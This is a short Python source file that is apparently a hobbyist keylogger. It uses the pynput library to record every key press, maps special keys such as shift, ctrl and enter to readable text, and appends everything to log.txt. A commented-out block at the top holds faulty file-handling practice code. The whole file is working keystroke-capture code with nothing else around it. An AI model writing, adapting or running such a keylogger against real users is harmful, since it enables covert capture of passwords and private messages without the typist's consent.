""" a=open("log.txt", 'a')#creating a txt file for storing keystrokes and storing it in variable a 
b = a.read()#reaing content of files and storing it in variable b
print(b)# printing the content var b
a.write("hello\n")#writing onto the file
a.close()#closing the file which we opened """
from pynput.keyboard import Listener


def writetofile(key):#writing into the function with passing the keystroke value as key
    keydata= str(key)#converting into the string
    keydata =keydata.replace("'", "")
    
    if keydata == "Key.space":
        keydata = " "
        
    if keydata == "Key.shift_r":
        keydata = " shift was pressed \n "
        
    if keydata == "Key.shift_l":
        keydata = " shift was pressed \n "
        
    if keydata=="Key.shift":
        keydata="shift was pressed \n"  
        
    if keydata == "Key.ctrl_l":
        keydata = " control was pressed \n "
        
    if keydata == "Key.ctrl_r":
        keydata = " control was pressed \n "
        
    if keydata == "Key.enter":
        keydata = " Enter was pressed \n"
        
    if keydata=="Key.alt_l":
        keydata=" alt was pressed \n "
        
    if keydata=="Key.alt_r":
        keydata=" alt was pressed \n "
        
    if keydata=="Key.tab":
        keydata=" tab was pressed \n "
        
    if keydata=="Key.backspace":
        keydata=" backspace \n"   
        
    with open("log.txt", 'a') as f:#using with keyword we can dynamically release memory and dont have to close file every instance
        f.write(keydata)
        
        
with Listener(on_press=writetofile) as m:
    m.join()#used to join all the keystroke 
    
